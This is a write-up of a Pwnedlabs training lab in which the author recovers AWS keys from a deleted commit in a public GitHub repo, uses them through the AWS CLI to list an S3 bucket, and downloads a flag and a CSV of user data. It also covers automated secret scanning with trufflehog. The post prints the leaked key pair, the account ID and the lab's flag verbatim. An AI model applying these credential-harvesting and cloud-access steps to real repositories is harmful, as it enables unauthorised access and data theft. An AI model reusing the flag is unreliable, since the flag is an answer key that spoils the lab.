---
author: Nithissh S
pubDatetime: 2024-02-14
modDatetime: 2024-02-14
title: Hunt for secrets in Git repos - Pwnedlabs walkthrough
slug: hunt-for-secrets-in-git-repos
featured: false
draft: false
tags:
  - Pwnedlabs
  - Cloud Pentest
description:
  Understanding the risks of public exposed organization's github repos 
---

## Hunt for secrets on git repos

  

| Repo Name |
| --- |
| [https://github.com/huge-logistics/cargo-logistics-dev](https://github.com/huge-logistics/cargo-logistics-dev) |

  

## Scenario

  

While conducting OSINT on a lesser-known dark web forum as part of assessing your client's threat landscape, you stumble upon a thread discussing high-value targets. Among the chaos of links and boasts, a user casually mentions discovering an intriguing GitHub repository belonging to your client, the international titan, Huge Logistics. A couple of underground researchers hint at having found something but remain cryptic. Your instincts tell you there's more to uncover. Your objective? Dive deep into this repository, trace any associated infrastructure, and uncover any vulnerabilities before they become tomorrow's headline. The clock is ticking. Will you outsmart the adversaries?

  

## To be more clear

We have to assess the organization github repository for any possibility of credentials leakage where we gonna try it out in both the manual and automated way 

  

## Let’s start out with the manual approach 

  

First and foremost, we will clone the github repository using the command `git clone https://github.com/huge-logistics/cargo-logistics-dev`and let’s start out our analysis process

  

```sh
nits@FWS-CHE-LT-8869 pwnedlabs.io % git clone https://github.com/huge-logistics/cargo-logistics-dev
Cloning into 'cargo-logistics-dev'...
remote: Enumerating objects: 1578, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 1578 (delta 2), reused 2 (delta 1), pack-reused 1571
Receiving objects: 100% (1578/1578), 50.12 MiB | 4.96 MiB/s, done.
Resolving deltas: 100% (448/448), done.
```

  

After cloning and going into that repo, we can run `git log`  in order to check for any sensitive actions being performed like where they had deleted or removed any files and found there is action been performed which is `Delete log-s3-test directory` and with commit hash as `ea1a7618508b8b0d4c7362b4044f1c8419a07d99`

  

```sh
nits@FWS-CHE-LT-8869 cargo-logistics-dev % git log
commit 327256a97593085dcee75e70df5f80c51a30c267 (HEAD -> main, origin/main, origin/HEAD)
Author: Ian Austin <iandaustin@outlook.com>
Date:   Wed Jul 5 17:56:49 2023 +0100

    Update

commit ea1a7618508b8b0d4c7362b4044f1c8419a07d99
Author: egre55 <34132245+egre55@users.noreply.github.com>
Date:   Wed Jul 5 17:46:16 2023 +0100

 Delete log-s3-test directory
```

  

Suspecting the particular action, we can able to view the log using the command `git show`  along with the commit hash which shows that there is big change been made and where the `AWS Access key`  and `Secret key`  being disclosed in the following filename `a/log-s3-test/log-upload.php`

  

![](../../assets/images/gitleaks-1.png) 

  

Well, let’s configure the following credentials through `awscli`  and with custom profile called `gitleaks`  

  

```sh
nits@FWS-CHE-LT-8869 cargo-logistics-dev % aws configure --profile gitleaks
AWS Access Key ID [None]: AKIAWHEOTHRFSGQITLIY
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```

  

After configuring the credentials, we found that is credentials belongs to `dev-test`  through `aws sts`  module 

  

```sh
nits@FWS-CHE-LT-8869 cargo-logistics-dev % aws sts get-caller-identity --profile gitleaks
{
    "UserId": "AIDAWHEOTHRF24EMR3SXJ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/dev-test"
}
```

  

What can we do with that credentials ? we know that it belongs to user called `dev-test`  but onething to note is we didn’t observe that this user have access to s3 bucket named `huge-logistics-transact` where you can check it into the git logs again and this are the lines of the code for your reference if you feel lazy to scroll up 

  

```diff
-// Send a PutObject request and get the result object.
-$key = 'transact.log';
-
-$result = $s3->putObject([
-       'Bucket' => 'huge-logistics-transact',
-       'Key'    => $key,
-       'SourceFile' => 'transact.log'
-]);
-
-// Print the body of the result by indexing into the result object.
-var_dump($result);
```

  

Enumerating s3 bucket using `aws s3`  module in `aws cli`  with the following command `aws s3 ls s3://huge-logistics-transact` and well we forgot we need to include `--profile gitleaks`  where we initially created a custom profile with the leaked credentials we have.. we found our `flag.txt`  here and through the `aws s3 cp`  we can copy it to our local machine 

  

```sh
nits@FWS-CHE-LT-8869 cargo-logistics-dev % aws s3 ls s3://huge-logistics-transact --profile gitleaks
2023-07-05 21:23:50         32 flag.txt
2023-07-04 22:45:47          5 transact.log
2023-07-05 21:27:36      51968 web_transactions.csv
nits@FWS-CHE-LT-8869 cargo-logistics-dev % aws s3 cp s3://huge-logistics-transact/flag.txt ./ --profile gitleaks
download: s3://huge-logistics-transact/flag.txt to ./flag.txt    
nits@FWS-CHE-LT-8869 cargo-logistics-dev % cat flag.txt
fe108d6a1a0937b0a7620947a678aabf%     
```

  

Well, It doesn’t end here we can also look into file named `web_transcations.csv`  and found that it is disclosing some kind of sensitive informations like `ip address, name and id of the user`  which is obviously not meant to be 

  

![](../../assets/images/gitleaks-2.png) 
  

  

## Automated way of finding the leaks 

  

We can use a tool called `trufflehog`  well In my case, I’m using MacOS where you can install using the command `brew install trufflehog`  or you can also use `gitleaks`

  

![](../../assets/images/gitleaks-3.png) 


  

Now run the following trufflehog git `https://github.com/huge-logistics/cargo-logistics-dev` and In the matter of seconds, we found our verified results with the valid username that those credentials belongs to well in our case, It is `dev-test` 

  

![](../../assets/images/gitleaks-4.png) 
 

  

Well the learning outcome is , That’s how we can analyse the organization github repo which are exposed externally for secret keys and In conclusion, we have to reduct our keys if you are deleting the file and rotate the leaked credentials